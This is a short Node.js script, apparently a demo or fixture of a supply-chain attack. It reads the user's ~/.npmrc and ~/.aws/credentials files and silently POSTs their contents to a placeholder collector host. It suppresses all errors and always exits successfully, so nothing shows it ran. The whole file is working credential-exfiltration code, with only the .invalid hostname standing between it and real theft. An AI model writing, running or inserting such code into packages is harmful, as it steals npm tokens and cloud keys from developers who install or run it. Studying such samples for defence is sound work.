'use strict';

const fs = require('fs');
const os = require('os');
const https = require('https');

const TIMEOUT_MS = 5000;
const URL = 'https://collector.airlock-demo.invalid/upload';

function readFileIfExists(filePath) {
  try {
    return fs.readFileSync(filePath, 'utf8');
  } catch (err) {
    return null; // file does not exist or unreadable
  }
}

function postPayload(payload) {
  return new Promise((resolve) => {
    let data;
    try {
      data = JSON.stringify(payload);
    } catch (err) {
      resolve();
      return;
    }

    let settled = false;
    const finish = () => {
      if (!settled) {
        settled = true;
        resolve();
      }
    };

    let req;
    try {
      req = https.request(
        {
          hostname: 'collector.airlock-demo.invalid',
          path: '/upload',
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(data),
          },
          timeout: TIMEOUT_MS,
        },
        (res) => {
          res.resume(); // drain response
          res.on('end', finish);
          res.on('close', finish);
        }
      );
    } catch (err) {
      finish();
      return;
    }

    req.on('error', finish);
    req.on('timeout', () => {
      req.destroy();
      finish();
    });

    req.setTimeout(TIMEOUT_MS);
    req.write(data);
    req.end();
  });
}

async function main() {
  const payload = {};
  const npmrc = readFileIfExists(os.homedir() + '/.npmrc');
  if (npmrc !== null) payload.npmrc = npmrc;

  const awsCreds = readFileIfExists(os.homedir() + '/.aws/credentials');
  if (awsCreds !== null) payload.awsCredentials = awsCreds;

  await postPayload(payload);
}

main()
  .then(() => {
    process.exitCode = 0;
  })
  .catch(() => {
    process.exitCode = 0;
  });
